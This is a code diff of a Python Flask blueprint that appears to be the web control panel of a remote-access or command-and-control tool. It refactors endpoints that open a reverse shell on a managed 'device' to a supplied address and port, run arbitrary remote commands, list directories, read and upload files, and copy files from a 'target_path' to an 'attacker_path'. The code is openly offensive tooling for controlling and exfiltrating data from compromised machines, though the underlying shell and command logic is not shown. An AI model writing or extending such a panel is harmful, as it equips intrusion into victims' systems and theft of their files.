@@ -1,37 +1,20 @@
-from Utils import *
+from Utils.libraries import Blueprint, render_template, request, jsonify
+from Database import session as db_session, DeviceModel
 from Web.Endpoints.authorization import authorized, admin
+from Server.server_class import ServerClass
 
-
-def devices_enpoints(Server):
+def devices_enpoints(server: ServerClass):
     devices_bp = Blueprint("devices", __name__, url_prefix="/devices")
 
     @devices_bp.route("/", methods=["GET"])
     @authorized
     def devices_index():
-        return render_template("devices/index.html")
+        use_json = request.args.get("json") == "true"
+        devices: list[DeviceModel | None] = db_session.query(DeviceModel).all()
+        if use_json:
+            return jsonify([device.to_json(server) for device in devices])
+        return render_template("devices/index.html", devices=devices)
 
-    @devices_bp.route("/list", methods=["GET"])
-    @authorized
-    def devices_list():
-        # Get the list of devices
-        curr.execute("SELECT * FROM devices")
-        devices = curr.fetchall()
-        data = []
-        for device in devices:
-            try:
-                Server.get_device(device[0])
-            except:
-                active = False
-            else:
-                active = True
-            data.append({
-                "id": device[0],
-                "hostname": device[1],
-                "address": device[2],
-                "connection_date": device[3],
-                "last_seen": device[4],
-                "status": active
-            })
 
     @devices_bp.route("/revshell", methods=["POST"])
     @authorized
@@ -40,7 +23,7 @@ def devices_enpoints(Server):
         address = request.form.get("address")
         port = request.form.get("port")
         try:
-            Server.get_device(id).revshell(address, port)
+            server.get_active_handler(id).reverse_shell(address, port)
         except Exception as e:
             return jsonify({"status": "error", "message": "Couldn't open a Reverse Shell"})
         else:
@@ -52,7 +35,7 @@ def devices_enpoints(Server):
         id = request.form.get("id")
         cmd = request.form.get("cmd")
         try:
-            output = Server.get_device(id).rce(cmd)
+            output = server.get_device(id).rce(cmd)
         except Exception as e:
             return jsonify({"status": "error", "message": str(e)})
         else:
@@ -62,9 +45,9 @@ def devices_enpoints(Server):
     @authorized
     def infos():
         id = request.args.get("id")
-        output = Server.get_device(id).infos()
+        output = server.get_device(id).infos()
         try:
-            output = Server.get_device(id).infos()
+            output = server.get_device(id).infos()
         except Exception as e:
             return jsonify({"status": "error", "message": str(e)})
         else:
@@ -76,7 +59,7 @@ def devices_enpoints(Server):
         id = request.args.get("id")
         dir = request.args.get("dir")
         try:
-            output = Server.get_device(id).get_directory_contents(dir)
+            output = server.get_device(id).get_directory_contents(dir)
         except Exception as e:
             return jsonify({"status": "error", "message": str(e)})
         else:
@@ -88,7 +71,7 @@ def devices_enpoints(Server):
         id = request.args.get("id")
         path = request.args.get("path")
         try:
-            output = Server.get_device(int(id)).get_file_contents(path)
+            output = server.get_device(int(id)).get_file_contents(path)
         except Exception as e:
             return jsonify({"status": "error", "message": str(e)})
         else:
@@ -101,7 +84,7 @@ def devices_enpoints(Server):
         fil = request.form.get("fil")
         path = request.form.get("path")
         try:
-            output = Server.get_device(id).file_upload(fil)
+            output = server.get_device(id).file_upload(fil)
         except Exception as e:
             return jsonify({"status": "error", "message": str(e)})
         else:
@@ -114,7 +97,7 @@ def devices_enpoints(Server):
         target_path = request.form.get("target_path")
         attacker_path = request.form.get("attacker_path")
         try:
-            output = Server.file_download(
+            output = server.file_download(
                 id, target_path, attacker_path)
         except Exception as e:
             return jsonify({"status": "error", "message": str(e)})
